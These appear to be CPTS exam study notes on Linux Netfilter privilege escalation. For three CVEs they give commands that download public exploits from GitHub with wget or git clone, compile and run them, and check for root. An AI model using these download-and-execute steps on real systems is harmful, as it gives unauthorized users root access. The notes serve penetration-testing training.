# **Netfilter – Linux Kernel Privilege Escalation**

## **1. Overview**

- **Netfilter** is a Linux kernel framework responsible for packet filtering, network address translation (NAT), and firewall operations.
- It controls network traffic by inspecting and manipulating individual packets.
- Tools such as `iptables` and `arptables` use the Netfilter framework.
- Vulnerabilities in Netfilter can allow local users to escalate privileges to `root`.

### **Main Functions of Netfilter**

1. **Packet Defragmentation** – Reassembles fragmented IP packets.
2. **Connection Tracking** – Tracks network connections and their states.
3. **Network Address Translation (NAT)** – Modifies source or destination IP addresses.

**Important:** Netfilter processes network packets before they reach their destination.

## **3. CVE-2021-22555**

**Type:** Heap Out-of-Bounds Write\
**Impact:** Local Privilege Escalation (LPE)\
**Affected Kernels:** `2.6 – 5.11`

### **Exploitation**

**Step 1: Check Kernel Version**

```
uname -r
```

**Step 2: Download Exploit**

```
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

**Step 3: Compile Exploit**

```
gcc -m32 -static exploit.c -o exploit
```

**Step 4: Execute Exploit**

```
./exploit
```

**Step 5: Verify Privileges**

```
id
```

Expected output:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Key Point:** Exploits memory corruption in Netfilter to obtain root privileges.

## **4. CVE-2022-25636**

**Type:** Heap Out-of-Bounds Write\
**Impact:** Local Privilege Escalation (LPE)

The vulnerability exists in:

```
net/netfilter/nf_dup_netdev.c
```

- Can allow local users to obtain root privileges.
- Exploitation involves kernel memory corruption.
- **Warning:** This exploit is unstable and may crash or corrupt the kernel, requiring a system reboot.

### **Exploitation**

**Step 1: Check Kernel Version**

```
uname -r
```

**Step 2: Download Exploit**

```
git clone https://github.com/Bonfee/CVE-2022-25636.git

cd CVE-2022-25636
```

**Step 3: Compile**

```
make
```

**Step 4: Execute**

```
./exploit
```

**Step 5: Verify Root Access**

```
id
```

Expected output:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Key Point:** Uses heap memory corruption techniques to manipulate kernel objects and achieve privilege escalation.

## **5. CVE-2023-32233**

**Type:** Use-After-Free (UAF)\
**Affected Component:** `nf_tables`\
**Affected Kernels:** Up to `6.3.1`

### **Vulnerability Concept**

- Exploits anonymous sets in `nf_tables`.
- Anonymous sets are temporary structures used while processing batch requests.
- Due to improper handling, a set can still be accessed after being freed.
- This creates a **Use-After-Free (UAF)** vulnerability.
- Attackers can manipulate kernel memory and potentially obtain root privileges.

### **Exploitation**

**Step 1: Download Exploit**

```
git clone https://github.com/Liuk3r/CVE-2023-32233

cd CVE-2023-32233
```

**Step 2: Compile**

```
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

**Step 3: Execute**

```
./exploit
```

**Step 4: Verify Root Access**

```
id
```

Expected output:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Key Point:** Exploits a Use-After-Free condition in Netfilter's `nf_tables` anonymous sets.

## **7. CPTS Exam Takeaways**

- Netfilter is a Linux kernel framework used for packet filtering, NAT, and connection tracking.
- Netfilter vulnerabilities can result in **Local Privilege Escalation (LPE)**.
- Always check the kernel version using `uname -r`.
- Identify the vulnerability type before selecting an exploit.
- Kernel exploits can be unstable and may crash the target system.
- Containers and virtual machines still depend on the underlying host kernel. Kernel vulnerabilities can therefore create container escape or host compromise risks, depending on the vulnerability and configuration.



Exam Tip

&#x20;When enumerating a Linux target, check its kernel version and look for known kernel vulnerabilities. Pay particular attention to Netfilter-related CVEs if the kernel falls within an affected version range.



**Note:** Kernel version ranges are initial screening indicators, not proof of vulnerability. Distribution-specific patches and backports can change whether a particular system is exploitable.
